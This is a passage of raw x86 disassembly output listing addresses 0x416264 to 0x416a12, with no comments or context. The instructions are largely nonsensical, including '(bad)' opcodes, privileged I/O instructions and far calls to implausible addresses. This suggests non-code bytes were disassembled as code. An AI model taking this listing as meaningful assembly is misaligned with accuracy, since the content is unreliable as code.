  416264:	or     BYTE PTR [edi-0x4e6af400],dl
  41626a:	stos   DWORD PTR es:[edi],eax
  41626b:	fs mov DWORD PTR fs:[ecx+0x638087fe],ecx
  416273:	addr16 add eax,0x67320062
  416279:	bound  ebx,QWORD PTR [esi+0x62]
  41627c:	pop    esi
  41627d:	pop    esi
  41627e:	pop    esi
  41627f:	bound  esp,QWORD PTR [edx+0x62]
  416282:	pop    esi
  416283:	pop    esp
  416284:	es call 0x4566909b
  41628a:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41628c:	inc    esp
  41628d:	sbb    eax,0x1a449f2e
  416292:	es push eax
  416294:	cmp    BYTE PTR [edi],bh
  416296:	jp     0x4162dd
  416298:	and    eax,0x4581264d
  41629d:	adc    eax,0x384d252e
  4162a2:	std    
  4162a3:	xchg   edx,eax
  4162a4:	std    
  4162a5:	std    
  4162a6:	std    
  4162a7:	add    ebp,edi
  4162a9:	std    
  4162aa:	add    BYTE PTR [eax],al
  4162ac:	or     dl,BYTE PTR [ecx+eax*1+0x70]
  4162b0:	add    DWORD PTR [ebp+0x11009706],edx
  4162b6:	xchg   ebx,eax
  4162b7:	test   al,0x96
  4162b9:	je     0x41632e
  4162bb:	je     0x416330
  4162bd:	or     BYTE PTR [ecx-0x73565657],0x7f
  4162c4:	arpl   WORD PTR gs:[edi+0x0],sp
  4162c8:	or     BYTE PTR [edx+0x0],ah
  4162cb:	sub    eax,0x6262625e
  4162d0:	addr16 pop esi
  4162d2:	pop    esp
  4162d3:	adc    ebp,eax
  4162d5:	adc    DWORD PTR [eax],edi
  4162d7:	inc    ebp
  4162d8:	cs cs pusha 
  4162db:	inc    esp
  4162dc:	es inc ebp
  4162de:	das    
  4162df:	and    eax,0x1538fe26
  4162e4:	and    eax,0x43436074
  4162e9:	push   eax
  4162ea:	inc    esp
  4162eb:	push   eax
  4162ec:	cmp    BYTE PTR [edi+0x58],bl
  4162ef:	cs cmp ch,bh
  4162f2:	add    DWORD PTR [ecx-0x2026d6e],eax
  4162f8:	std    
  4162f9:	add    BYTE PTR [eax],al
  4162fb:	add    BYTE PTR [ecx],cl
  4162fd:	push   esp
  4162fe:	add    DWORD PTR [edi-0x68fb6aff],ecx
  416304:	add    BYTE PTR ds:0x7199989d,dl
  41630a:	ins    BYTE PTR es:[edi],dx
  41630b:	je     0x416380
  41630d:	jae    0x416382
  41630f:	xchg   esi,eax
  416310:	or     BYTE PTR [ecx-0x76565674],0x89
  416317:	lea    edi,[edi+0x5f]
  41631a:	arpl   WORD PTR [eax],ax
  41631c:	pop    es
  41631d:	bound  eax,QWORD PTR [eax]
  41631f:	sub    eax,0x67626267
  416324:	bound  ebx,QWORD PTR [esi+0x5e]
  416327:	or     ebp,eax
  416329:	adc    DWORD PTR [edi+0x44],ebx
  41632c:	inc    ebx
  41632d:	sbb    dl,BYTE PTR es:[esi+0x74]
  416331:	sbb    BYTE PTR [edx],0x43
  416334:	es inc ebp
  416336:	es inc esp
  416338:	cmp    BYTE PTR ds:0x268c3825,ah
  41633e:	das    
  41633f:	cs inc ebp
  416341:	inc    ecx
  416342:	es and al,0x78
  416345:	or     DWORD PTR [esi-0x4e566504],0xb3b6
  41634f:	add    BYTE PTR [edi],al
  416351:	push   esp
  416352:	add    BYTE PTR [edx],ah
  416354:	bound  edx,QWORD PTR [edi+edx*4-0x6e6c6869]
  41635b:	cdq    
  41635c:	adc    al,0x55
  41635e:	cmp    al,0x4f
  416360:	test   BYTE PTR [ebx+esi*2+0x74],dh
  416364:	jae    0x4163d9
  416366:	or     BYTE PTR [ecx-0x65730157],0x89
  41636d:	mov    DWORD PTR [eax+0x456c7473],eax
  416373:	inc    ebp
  416374:	bound  eax,QWORD PTR [bx]
  416377:	add    BYTE PTR [bx+si],ch
  41637a:	bound  esi,QWORD PTR [esi+0xb]
  41637d:	call   0x44669793
  416382:	pusha  
  416383:	cmp    BYTE PTR [eax],bh
  416385:	push   eax
  416386:	sbb    al,BYTE PTR [esp+eiz*2+0x43]
  41638a:	cs inc ebx
  41638c:	pusha  
  41638d:	inc    ebp
  41638e:	aas    
  41638f:	es test BYTE PTR es:[eax+0x45],dl
  416394:	cmp    DWORD PTR [edi],0x43
  416397:	push   esi
  416398:	push   esi
  416399:	aaa    
  41639a:	ret    0xdacd
  41639d:	fld1   
  41639f:	fcmovnbe st,st(3)
  4163a1:	rol    BYTE PTR [eax],cl
  4163a3:	add    BYTE PTR [ecx],al
  4163a5:	dec    ebx
  4163a6:	add    eax,0x67520054
  4163ab:	xchg   ebp,eax
  4163ac:	xchg   edi,eax
  4163ad:	xchg   edi,eax
  4163ae:	sahf   
  4163af:	xchg   ecx,eax
  4163b0:	dec    ecx
  4163b1:	cmp    al,0x24
  4163b3:	dec    ebp
  4163b4:	and    al,0x4d
  4163b6:	dec    ebp
  4163b7:	cmp    BYTE PTR [ebx+0x74],dh
  4163ba:	jae    0x41642f
  4163bc:	or     BYTE PTR [ebp-0x73786577],0xfe
  4163c3:	mov    WORD PTR [ecx-0x698b8b55],cs
  4163c9:	fiadd  DWORD PTR [esi]
  4163cb:	cli    
  4163cc:	arpl   WORD PTR [edi+0x67],sp
  4163cf:	arpl   WORD PTR [bx+0x63],sp
  4163d3:	addr16 addr16 es div esp
  4163d8:	adc    DWORD PTR [ebx],edi
  4163da:	push   eax
  4163db:	push   eax
  4163dc:	inc    ebx
  4163dd:	inc    esp
  4163de:	gs and eax,0x43267c43
  4163e4:	pusha  
  4163e5:	es cs dec ebp
  4163e8:	inc    ebp
  4163e9:	(bad)  
  4163ea:	jb     0x416401
  4163ec:	and    eax,0x56437464
  4163f1:	das    
  4163f2:	cs sub esi,ebp
  4163f5:	icebp  
  4163f6:	in     eax,0xe5
  4163f8:	shl    ebp,cl
  4163fa:	(bad)
  4163fd:	add    BYTE PTR ds:0x63180054,al
  416403:	xchg   ebp,eax
  416404:	fwait
  416405:	xchg   ebx,eax
  416406:	adc    ch,BYTE PTR [ebx]
  416408:	cmp    al,0x4d
  41640a:	cmp    eax,0x4d2e4d17
  41640f:	cmp    al,0x26
  416411:	pusha  
  416412:	je     0x416487
  416414:	stos   DWORD PTR es:[edi],eax
  416415:	lea    ecx,[ebp+0x4fe8c41]
  41641b:	mov    WORD PTR [eax],es
  41641d:	aaa    
  41641e:	xor    BYTE PTR [esp+esi*2-0x80],0xc2
  416423:	(bad)  
  416425:	or     edi,ebx
  416427:	dec    edx
  416428:	arpl   WORD PTR [edi+0x63],sp
  41642b:	arpl   WORD PTR [bx+0x38],sp
  41642f:	call   0x7381761c
  416434:	inc    ebx
  416435:	and    eax,0x64455026
  41643a:	das    
  41643b:	adc    eax,0x49387326
  416440:	push   esi
  416441:	sub    al,0x45
  416443:	push   eax
  416444:	js     0x41646c
  416446:	aaa    
  416447:	sbb    ah,BYTE PTR ds:0x5624446c
  41644d:	fucom  st(5)
  41644f:	out    0xe6,al
  416451:	out    0xc5,al
  416453:	jmp    0x416529
  416458:	add    al,0x54
  41645a:	add    BYTE PTR [edx+eiz*2-0x68],dl
  41645e:	xchg   ecx,eax
  41645f:	jno    0x416478
  416461:	push   ebp
  416462:	dec    ebp
  416463:	cmp    eax,0x243d2455
  416468:	cs dec ebp
  41646a:	dec    ebp
  41646b:	dec    ecx
  41646c:	ins    BYTE PTR es:[edi],dx
  41646d:	jae    0x4164e2
  41646f:	jg     0x4163fe
  416471:	mov    DWORD PTR [ecx-0x1736566],ebp
  416477:	mov    cs,WORD PTR [ecx-0x7f8c8b80]
  41647d:	ret    0xe06
  416480:	push   es
  416481:	ffreep st(1)
  416483:	sti    
  416484:	inc    esp
  416485:	arpl   WORD PTR [bp+di+0x63],sp
  416489:	cli    
  41648a:	fcomi  st,st(4)
  41648c:	adc    DWORD PTR ds:0x25804586,esi
  416492:	cs inc ebp
  416494:	test   BYTE PTR [esi],ah
  416496:	inc    ebp
  416497:	inc    ebx
  416498:	inc    ebx
  416499:	dec    ecx
  41649a:	pop    edi
  41649b:	ins    BYTE PTR es:[edi],dx
  41649c:	dec    ecx
  41649d:	and    al,0x50
  41649f:	cmp    DWORD PTR [esp+0x15],ebp
  4164a3:	dec    ecx
  4164a4:	jae    0x4164ea
  4164a6:	push   esi
  4164a7:	pop    ss
  4164a8:	into   
  4164a9:	rol    cl,0xd0
  4164ac:	mov    esp,0x898db4
  4164b1:	add    BYTE PTR [eax],al
  4164b3:	pop    eax
  4164b4:	dec    ebx
  4164b5:	push   esp
  4164b6:	push   esp
  4164b7:	pop    esi
  4164b8:	and    eax,0x1e4f3c17
  4164bd:	pop    ss
  4164be:	dec    ebp
  4164bf:	cmp    al,0x3d
  4164c1:	dec    ebp
  4164c2:	push   ebp
  4164c3:	push   ebp
  4164c4:	cmp    eax,0x453d174d
  4164c9:	jae    0x41644b
  4164cb:	lea    ecx,[ecx-0x65717377]
  4164d1:	call   0x9674:0x739a9afe
  4164d8:	jae    0x416496
  4164da:	fild   WORD PTR [esi]
  4164dc:	fild   WORD PTR [esi]
  4164de:	push   cs
  4164df:	fdivrp st(7),st
  4164e1:	mov    ebp,0xfa635944
  4164e6:	fucomi st,st(0)
  4164e8:	adc    DWORD PTR [edi],ebp
  4164ea:	test   BYTE PTR cs:[eax+edi*1+0x38],ch
  4164ef:	dec    ecx
  4164f0:	cs inc esp
  4164f2:	jg     0x41650e
  4164f4:	and    al,0x49
  4164f6:	test   BYTE PTR [edx+0x25],bh
  4164f9:	inc    ebx
  4164fa:	sbb    al,BYTE PTR [ebp+0x26]
  4164fd:	dec    ecx
  4164fe:	cmp    BYTE PTR [edi],bh
  416500:	push   eax
  416501:	aaa    
  416502:	push   ebp
  416503:	push   ebp
  416504:	sbb    DWORD PTR [edx+0x7e418789],0xffffff89
  41650b:	mov    DWORD PTR [eax],eax
  41650d:	add    BYTE PTR [eax],al
  41650f:	pop    eax
  416510:	push   esp
  416511:	push   esp
  416512:	(bad)  
  416513:	xchg   ebx,eax
  416514:	pop    ss
  416515:	dec    ebp
  416516:	dec    ebp
  416517:	pop    ss
  416518:	dec    ebp
  416519:	push   ebp
  41651a:	and    al,0x3d
  41651c:	pop    ss
  41651d:	pop    ss
  41651e:	push   ebp
  41651f:	pop    ss
  416520:	pop    ss
  416521:	dec    ebp
  416522:	pop    ss
  416523:	cmp    al,0x8b
  416525:	jae    0x4164a7
  416527:	jg     0x4164b2
  416529:	mov    DWORD PTR [edx-0x71657179],ebx
  41652f:	xchg   edx,eax
  416530:	mov    DWORD PTR [ebx-0x577f8c8c],ebp
  416536:	push   es
  416537:	fild   WORD PTR [esi]
  416539:	(bad)  
  41653b:	(bad)  
  41653d:	push   es
  41653e:	or     eax,DWORD PTR [ebp-0xb17f4a1]
  416544:	adc    DWORD PTR [edi],ebp
  416546:	es inc ebx
  416548:	and    eax,0x2537747a
  41654d:	aas    
  41654e:	push   eax
  41654f:	and    eax,0x2e243844
  416554:	inc    ebx
  416555:	add    BYTE PTR [ebp+0x3c],0x55
  416559:	push   eax
  41655a:	jge    0x416594
  41655c:	cmp    al,0x24
  41655e:	cs push ebp
  416560:	mov    ebp,0x897f8989
  416565:	mov    DWORD PTR [edi+0x7f],edi
  416568:	add    BYTE PTR [eax],al
  41656a:	add    BYTE PTR [esi],cl
  41656c:	push   0x3793958f
  416571:	cs push ebp
  416573:	dec    edi
  416574:	and    al,0x17
  416576:	dec    ebp
  416577:	dec    ebp
  416578:	dec    ebp
  416579:	cmp    al,0x4
  41657b:	dec    ebp
  41657c:	add    BYTE PTR [esi+0x55],al
  41657f:	cmp    al,0x26
  416581:	jae    0x416510
  416583:	mov    DWORD PTR [ecx-0x65716579],ecx
  416589:	call   0x7374:0x738c818e
  416590:	jae    0x416606
  416592:	test   DWORD PTR [esi],0xde06dedf
  416598:	fiadd  WORD PTR [esi]
  41659a:	jmp    0xea2b36a5
  41659f:	jmp    0x4165b2
  4165a1:	sub    al,0x89
  4165a3:	sbb    ah,BYTE PTR ds:0x60452650
  4165a9:	cmp    eax,0x45655824
  4165ae:	cs cmp eax,0x37266c25
  4165b4:	and    eax,0x503f4525
  4165b9:	push   eax
  4165ba:	dec    ecx
  4165bb:	cmp    al,0x26
  4165bd:	cmp    BYTE PTR [edi-0x80],0x80
  4165c1:	jae    0x416636
  4165c3:	test   al,0x0
  4165c5:	add    BYTE PTR [eax],al
  4165c7:	sbb    DWORD PTR [ebp-0x666a6869],edx
  4165cd:	adc    eax,0x3c4f553d
  4165d2:	dec    ebp
  4165d3:	and    al,0x4d
  4165d5:	dec    ebp
  4165d6:	cmp    al,0x55
  4165d8:	push   ebp
  4165d9:	dec    ebp
  4165da:	dec    ebp
  4165db:	cmp    al,0x26
  4165dd:	or     BYTE PTR [ecx+0x4008c89],0x9a
  4165e4:	add    BYTE PTR [esi],cl
  4165e6:	mov    ss,WORD PTR [edx-0x698c7602]
  4165ec:	jae    0x41656e
  4165ee:	je     0x4165b0
  4165f0:	out    0x6,al
  4165f2:	(bad)  
  4165f4:	add    al,0xde
  4165f6:	add    BYTE PTR [ecx],ch
  4165f8:	jmp    0xa2a4fdb
  4165fd:	push   cs
  4165fe:	inc    ebx
  4165ff:	es inc ebp
  416601:	jae    0x41661d
  416603:	cs es push eax
  416606:	es inc esp
  416608:	aas    
  416609:	pop    ebp
  41660a:	dec    ecx
  41660b:	cmp    BYTE PTR [eax+edx*2+0x3c],ah
  41660f:	cmp    eax,0x243f6045
  416614:	cmp    al,0x79
  416616:	inc    esp
  416617:	aaa    
  416618:	push   ebp
  416619:	sub    edi,DWORD PTR [ebp-0x12f73e3f]
  41661f:	loope  0x4165fd
  416621:	add    BYTE PTR [eax],al
  416623:	add    BYTE PTR [eax],al
  416625:	sbb    edx,DWORD PTR [edi-0x6f6a6a6b]
  41662b:	cs pop ss
  41662d:	push   ebp
  41662e:	pop    ss
  41662f:	pop    ss
  416630:	push   ebp
  416631:	dec    ebp
  416632:	and    al,0x55
  416634:	and    al,0x4d
  416636:	cmp    al,0x4d
  416638:	dec    ebp
  416639:	push   ebp
  41663a:	inc    ebx
  41663b:	jg     0x4165c6
  41663d:	test   eax,0x8cfe9a
  416642:	add    al,0x8e
  416644:	add    BYTE PTR [ecx],bh
  416646:	dec    BYTE PTR [ebp+0x7f807380]
  41664c:	jae    0x416628
  41664e:	push   es
  41664f:	(bad)  
  416651:	fiadd  WORD PTR [esi]
  416653:	push   es
  416654:	(bad)  
  416656:	fsubp  st(1),st
  416658:	or     ecx,ebp
  41665a:	hlt    
  41665b:	or     BYTE PTR [edi],dl
  41665d:	and    al,0x26
  41665f:	cmp    BYTE PTR [eax],bh
  416661:	inc    ebp
  416662:	cs cmp al,0x38
  416665:	pop    edi
  416666:	aas    
  416667:	cmp    al,0x4d
  416669:	push   eax
  41666a:	cmp    BYTE PTR ds:0x13493d3c,ah
  416670:	dec    ecx
  416671:	push   ebp
  416672:	dec    ebp
  416673:	sub    eax,DWORD PTR [ebx+0x4d]
  416676:	cmp    eax,0xdddd044f
  41667b:	fstp   st(4)
  41667d:	(bad)  
  41667f:	add    BYTE PTR [eax],al
  416681:	add    BYTE PTR [eax],al
  416683:	daa    
  416684:	xchg   edi,eax
  416685:	xchg   ebp,eax
  416686:	xchg   esp,eax
  416687:	xchg   ebp,eax
  416688:	mov    esp,0x553d1749
  41668d:	dec    ebp
  41668e:	and    al,0x4d
  416690:	dec    ebp
  416691:	push   ebp
  416692:	dec    ebp
  416693:	push   ebp
  416694:	dec    ebp
  416695:	cmp    al,0x4d
  416697:	dec    ebp
  416698:	aaa    
  416699:	jae    0x416624
  41669b:	inc    ecx
  41669c:	call   0x8e92:0x8efe8e8c
  4166a3:	dec    BYTE PTR [ecx-0x54807273]
  4166a9:	jge    0x41667c
  4166ab:	add    BYTE PTR [esi],al
  4166ad:	fiadd  WORD PTR [eax]
  4166af:	sbb    DWORD PTR [esi],eax
  4166b1:	out    0xe9,al
  4166b3:	push   es
  4166b4:	jmp    0x1a504fa2
  4166b9:	inc    ebp
  4166ba:	inc    ebx
  4166bb:	dec    ebp
  4166bc:	cmp    BYTE PTR [ebp+edi*1+0x17],al
  4166c0:	cmp    eax,0x4d4d553d
  4166c5:	push   ebp
  4166c6:	dec    ebp
  4166c7:	cmp    eax,0x5504004d
  4166cc:	add    BYTE PTR [esi],cl
  4166ce:	cmp    eax,0x4d554f4f
  4166d3:	dec    edi
  4166d4:	push   ebp
  4166d5:	adc    ch,bl
  4166d7:	fstp   st(4)
  4166d9:	fstp   st(5)
  4166db:	fadd   QWORD PTR [eax]
  4166dd:	add    BYTE PTR [ecx],al
  4166df:	xchg   edi,eax
  4166e0:	add    al,0x95
  4166e2:	add    BYTE PTR [ebx+0x12],dl
  4166e5:	dec    ebp
  4166e6:	pop    ss
  4166e7:	dec    ebp
  4166e8:	pop    ss
  4166e9:	dec    ebp
  4166ea:	dec    ebp
  4166eb:	dec    ebp
  4166ec:	and    al,0x55
  4166ee:	dec    ebp
  4166ef:	push   ebp
  4166f0:	dec    ebp
  4166f1:	push   ebp
  4166f2:	pop    ss
  4166f3:	cmp    eax,0x8cfe8c6c
  4166f8:	xchg   esi,edi
  4166fa:	cld    
  4166fb:	cld    
  4166fc:	mov    ?,ebp
  4166fe:	mov    DWORD PTR [ecx-0x76768177],ecx
  416704:	gs ret 0xdfde
  416708:	push   es
  416709:	push   cs
  41670a:	push   es
  41670b:	push   es
  41670c:	fild   WORD PTR [esi]
  41670e:	push   es
  41670f:	or     ch,cl
  416711:	jmp    0x7f7975fe
  416716:	aas    
  416717:	cmp    al,0x49
  416719:	dec    ecx
  41671a:	push   ebp
  41671b:	cmp    eax,0x3d4d4f4d
  416720:	cmp    eax,0x4f554f17
  416725:	dec    edi
  416726:	dec    ebp
  416727:	dec    ebp
  416728:	dec    edi
  416729:	push   ebp
  41672a:	dec    ebp
  41672b:	dec    ebp
  41672c:	dec    edi
  41672d:	dec    ebp
  41672e:	dec    edi
  41672f:	dec    edi
  416730:	iret   
  416731:	fstp   st(5)
  416733:	fstp   st(4)
  416735:	fstp   st(5)
  416737:	add    BYTE PTR [eax],al
  416739:	add    BYTE PTR [edx*4+0x78972b00],al
  416740:	dec    ebp
  416741:	dec    ebp
  416742:	dec    edi
  416743:	pop    ss
  416744:	and    al,0x3d
  416746:	pop    ss
  416747:	cmp    al,0x4d
  416749:	and    al,0x3c
  41674b:	dec    ebp
  41674c:	dec    ebp
  41674d:	dec    ebp
  41674e:	cs inc esp
  416750:	xchg   DWORD PTR [ecx-0x1017172],ecx
  416756:	mov    ?,ebp
  416758:	call   0x807e:0xa9898cfe
  41675f:	jae    0x41675b
  416761:	fild   WORD PTR [esi]
  416763:	fild   WORD PTR [esi]
  416765:	(bad)  
  416767:	jmp    0xe945684a
  41676c:	add    BYTE PTR ds:0x79eff7db,ah
  416772:	cmp    eax,0x3d4d4f4d
  416777:	dec    ebp
  416778:	dec    ebp
  416779:	dec    edi
  41677a:	dec    edi
  41677b:	dec    ebp
  41677c:	pop    ss
  41677d:	cmp    eax,0x4d4f4d4d
  416782:	dec    edi
  416783:	pop    ss
  416784:	dec    ebp
  416785:	cmp    eax,0x174d4f4d
  41678a:	dec    edi
  41678b:	dec    edi
  41678c:	or     al,0x4
  41678e:	fstp   st(5)
  416790:	loope  0x4167a1
  416792:	rol    DWORD PTR [eax],0x0
  416795:	add    BYTE PTR [eax],al
  416797:	daa    
  416798:	xchg   ebp,eax
  416799:	xchg   esp,eax
  41679a:	xchg   esp,eax
  41679b:	xchg   ebp,eax
  41679c:	xchg   ebp,eax
  41679d:	stos   BYTE PTR es:[edi],al
  41679e:	cs pop ss
  4167a0:	pop    ss
  4167a1:	dec    ebp
  4167a2:	dec    ebp
  4167a3:	and    al,0x4d
  4167a5:	pop    ss
  4167a6:	pop    ss
  4167a7:	dec    ebp
  4167a8:	and    al,0x55
  4167aa:	dec    ebp
  4167ab:	and    al,0x2e
  4167ad:	inc    eax
  4167ae:	xchg   esi,edi
  4167b0:	mov    esi,?
  4167b2:	mov    cs,WORD PTR [esi-0x78710372]
  4167b8:	(bad)  
  4167b9:	(bad)  
  4167ba:	test   eax,0xfb74737f
  4167bf:	add    BYTE PTR [edi+ebx*8],al
  4167c2:	add    BYTE PTR [esi+ebx*8],al
  4167c5:	jmp    0xe9466ea8
  4167ca:	add    BYTE PTR [esi+eax*1],ah
  4167cd:	adc    al,0x4d
  4167cf:	cmp    eax,0x4d3d4d3d
  4167d4:	cmp    eax,0x4d4f4d55
  4167d9:	cmp    eax,0x4f174f17
  4167de:	pop    ss
  4167df:	dec    edi
  4167e0:	pop    ss
  4167e1:	cmp    al,0x3c
  4167e3:	dec    ebp
  4167e4:	cmp    al,0x3c
  4167e6:	dec    edi
  4167e7:	push   ebp
  4167e8:	dec    edi
  4167e9:	adc    al,0xe3
  4167eb:	out    dx,eax
  4167ec:	cmp    DWORD PTR [edx+0x64],0x5a
  4167f0:	add    BYTE PTR [eax],al
  4167f2:	add    BYTE PTR [ebx],bl
  4167f4:	xchg   esp,eax
  4167f5:	xchg   esp,eax
  4167f6:	xchg   ebp,eax
  4167f7:	xchg   edi,eax
  4167f8:	xchg   edi,eax
  4167f9:	xchg   ecx,eax
  4167fa:	adc    eax,0x4d4d173d
  4167ff:	and    al,0x4d
  416801:	and    al,0x4d
  416803:	and    al,0x3d
  416805:	dec    ebp
  416806:	pop    ss
  416807:	cmp    eax,0x8e412c15
  41680c:	call   0x8e:0x600fe8e
  416813:	or     eax,0x7480a987
  416818:	pusha  
  416819:	sti    
  41681a:	fild   WORD PTR [esi]
  41681c:	(bad)  
  41681e:	fild   WORD PTR [esi]
  416820:	fiadd  WORD PTR [eax]
  416822:	add    eax,0xe82500e9
  416827:	fist   WORD PTR [eax]
  416829:	dec    ebp
  41682a:	cmp    eax,0x4d2e4d3d
  41682f:	dec    ebp
  416830:	dec    ebp
  416831:	cmp    eax,0x2b4f2b3d
  416836:	cmp    eax,0x3d563d2b
  41683b:	aaa    
  41683c:	pop    eax
  41683d:	add    BYTE PTR [ebx+0x58],0x50
  416841:	jnp    0x416893
  416843:	in     al,0x83
  416845:	arpl   WORD PTR [ebx+0x5f],sp
  416848:	fs fs jge 0x41684c
  41684c:	add    BYTE PTR [eax],al
  41684e:	add    BYTE PTR [eax-0x6c],bl
  416851:	xchg   ebp,eax
  416852:	xchg   ebp,eax
  416853:	(bad)  
  416854:	bound  edx,QWORD PTR [ecx+0x2f]
  416857:	dec    ebp
  416858:	dec    ebp
  416859:	cs cs dec ebp
  41685c:	push   ebp
  41685d:	pop    ss
  41685e:	dec    ebp
  41685f:	pop    ss
  416860:	pop    ss
  416861:	dec    ebp
  416862:	dec    ebp
  416863:	cs das 
  416865:	xor    al,0x65
  416867:	cld    
  416868:	mov    es,WORD PTR [edi-0x6d717172]
  41686e:	cld    
  41686f:	xchg   edx,eax
  416870:	(bad)  
  416871:	dec    BYTE PTR [ebp-0x60939f8d]
  416877:	in     eax,dx
  416878:	push   cs
  416879:	(bad)  
  41687b:	push   es
  41687c:	push   cs
  41687d:	push   es
  41687e:	(bad)  
  416880:	call   0xea2a526e
  416885:	in     al,dx
  416886:	cs dec ebp
  416888:	cmp    eax,0x10141417
  41688d:	pop    es
  41688e:	pop    es
  41688f:	fcomp  st(0)
  416891:	fdivr  DWORD PTR [eax+0x7b]
  416894:	inc    ebx
  416895:	jl     0x416913
  416897:	jl     0x41690f
  416899:	addr16 jo 0x41690b
  41689c:	jbe    0x41690d
  41689e:	bound  esp,QWORD PTR [edx-0x11]
  4168a1:	cli    
  4168a2:	arpl   WORD PTR [edi+0x64],bx
  4168a5:	fs jge 0x41690c
  4168a8:	add    BYTE PTR [eax],al
  4168aa:	add    BYTE PTR [ecx],dh
  4168ac:	xchg   esp,eax
  4168ad:	xchg   esp,eax
  4168ae:	xchg   ebp,eax
  4168af:	addr16 dec ebx
  4168b1:	push   ecx
  4168b2:	das    
  4168b3:	dec    ebp
  4168b4:	dec    ebp
  4168b5:	cs and al,0x24
  4168b8:	push   ebp
  4168b9:	push   ebp
  4168ba:	and    al,0x4d
  4168bc:	and    al,0x55
  4168be:	dec    ebp
  4168bf:	cmp    esp,DWORD PTR cs:[ebx]
  4168c2:	pop    edi
  4168c3:	std    
  4168c4:	call   0xfdfe:0x8efcfd9a
  4168cb:	mov    ds,WORD PTR [edx+0x74748089]
  4168d1:	jp     0x416877
  4168d3:	or     BYTE PTR [esi],al
  4168d5:	(bad)  
  4168d7:	out    0x6,al
  4168d9:	push   es
  4168da:	fsubp  st(1),st
  4168dc:	fiadd  WORD PTR [eax]
  4168de:	add    al,0xe8
  4168e0:	add    BYTE PTR [ebx],ah
  4168e2:	pop    es
  4168e3:	sub    edx,DWORD PTR [eax]
  4168e5:	pop    es
  4168e6:	pop    es
  4168e7:	fdiv   st,st(5)
  4168e9:	cmc    
  4168ea:	cmc    
  4168eb:	(bad)  
  4168ed:	ffreep st(5)
  4168ef:	into   
  4168f0:	js     0x41696e
  4168f2:	jl     0x416970
  4168f4:	jb     0x416965
  4168f6:	bound  ebx,QWORD PTR [bp+0x6f]
  4168fa:	sub    al,0x6f
  4168fc:	bound  ecx,QWORD PTR [edx+0x5f5f7ac1]
  416902:	pop    ecx
  416903:	fs jge 0x416906
  416906:	add    BYTE PTR [eax],al
  416908:	add    BYTE PTR [eax-0x6c],bl
  41690b:	xchg   ebp,eax
  41690c:	xchg   edi,eax
  41690d:	(bad)  
  41690e:	dec    ebx
  41690f:	dec    ebx
  416910:	das    
  416911:	and    al,0x2e
  416913:	cs dec ebp
  416915:	cmp    al,0x55
  416917:	push   ebp
  416918:	dec    ebp
  416919:	pop    ss
  41691a:	dec    ebp
  41691b:	push   ebp
  41691c:	dec    ebp
  41691d:	das    
  41691e:	cmp    esp,DWORD PTR [ebx]
  416920:	inc    eax
  416921:	std    
  416922:	mov    ds,WORD PTR [edx-0x7171037f]
  416928:	cld    
  416929:	mov    ?,esi
  41692b:	stos   DWORD PTR es:[edi],eax
  41692c:	jae    0x41698e
  41692e:	pusha  
  41692f:	jp     0x4168d5
  416931:	shl    esi,0xdf
  416934:	(bad)  
  416936:	fiadd  WORD PTR [esi]
  416938:	jmp    0xe92b5322
  41693d:	call   0xd937482d
  416942:	cmc    
  416943:	fdiv   st,st(5)
  416945:	cmc    
  416946:	fcomp  st(0)
  416948:	cmc    
  416949:	(bad)  
  41694b:	(bad)  
  41694d:	cdq    
  41694e:	jl     0x4169cc
  416950:	jl     0x4169c4
  416952:	outs   dx,DWORD PTR ds:[esi]
  416953:	jo     0x4169c5
  416955:	jbe    0x4169b5
  416957:	cmp    BYTE PTR [esi+0x40],dh
  41695a:	inc    ebp
  41695b:	out    dx,eax
  41695c:	sti    
  41695d:	pop    edi
  41695e:	fs fs fs add BYTE PTR fs:[eax],al
  416964:	add    BYTE PTR [eax-0x6b],bl
  416967:	xchg   ebp,eax
  416968:	xchg   ebp,eax
  416969:	fwait
  41696a:	outs   dx,DWORD PTR ds:[esi]
  41696b:	cmp    bh,BYTE PTR [ebx]
  41696d:	dec    edi
  41696e:	cs cs dec ebp
  416971:	push   ebp
  416972:	cmp    al,0x4d
  416974:	pop    ss
  416975:	dec    ebp
  416976:	pop    ss
  416977:	dec    ebp
  416978:	cs das 
  41697a:	sbb    eax,0x9afd4023
  41697f:	mov    ?,esp
  416981:	xchg   edx,eax
  416982:	dec    BYTE PTR [esi-0x7f767172]
  416988:	pusha  
  416989:	test   al,0x7a
  41698b:	ins    BYTE PTR es:[edi],dx
  41698c:	jp     0x416988
  41698e:	(bad)  
  416990:	(bad)  
  416992:	fsubp  st(1),st
  416994:	push   es
  416995:	jmp    0xe92a5283
  41699a:	jmp    0xdcd8:0xd8f5d8e9
  4169a1:	fdiv   st,st(5)
  4169a3:	cmc    
  4169a4:	fdiv   st,st(5)
  4169a6:	(bad)  
  4169a8:	fsubr  st(4),st
  4169aa:	jl     0x416a28
  4169ac:	jl     0x416a06
  4169ae:	jo     0x416a13
  4169b0:	outs   dx,DWORD PTR ds:[esi]
  4169b1:	outs   dx,DWORD PTR ds:[esi]
  4169b2:	push   eax
  4169b3:	jbe    0x416a2b
  4169b5:	outs   dx,DWORD PTR ds:[esi]
  4169b6:	jo     0x416975
  4169b8:	mov    ebp,0x64645f6c
  4169bd:	mov    esp,0x2e000000
  4169c2:	xchg   ebp,eax
  4169c3:	xchg   ebp,eax
  4169c4:	xchg   edi,eax
  4169c5:	xchg   edi,eax
  4169c6:	xchg   ebx,eax
  4169c7:	push   ecx
  4169c8:	cmp    ebp,DWORD PTR [esi]
  4169ca:	cs cmp eax,0x174d3c4d
  4169d0:	dec    ebp
  4169d1:	dec    ebp
  4169d2:	and    al,0x2e
  4169d4:	cs das 
  4169d6:	and    ebx,DWORD PTR ds:0x878efe36
  4169dc:	mov    ?,esi
  4169de:	mov    ?,esi
  4169e0:	cld    
  4169e1:	xchg   DWORD PTR [ecx+0x7a7a7a60],ecx
  4169e7:	test   DWORD PTR [edx+edi*8-0x22],ebp
  4169eb:	(bad)  
  4169ed:	fild   WORD PTR [esi]
  4169ef:	push   es
  4169f0:	add    al,0xe9
  4169f2:	add    BYTE PTR [esi],ah
  4169f4:	call   0xf62a54e4
  4169f9:	cmc    
  4169fa:	fdiv   st,st(5)
  4169fc:	cmc    
  4169fd:	cmc    
  4169fe:	fdiv   st,st(5)
  416a00:	fcomip st,st(5)
  416a02:	cmc    
  416a03:	fcomp  st(0)
  416a05:	adc    bh,BYTE PTR [esp+edi*2+0x7c]
  416a09:	jbe    0x416a7b
  416a0b:	arpl   WORD PTR [eax+0x76],si
  416a0e:	push   eax
  416a0f:	jbe    0x416a89
  416a11:	outs   dx,DWORD PTR ds:[esi]
  416a12:	jo     0x416997
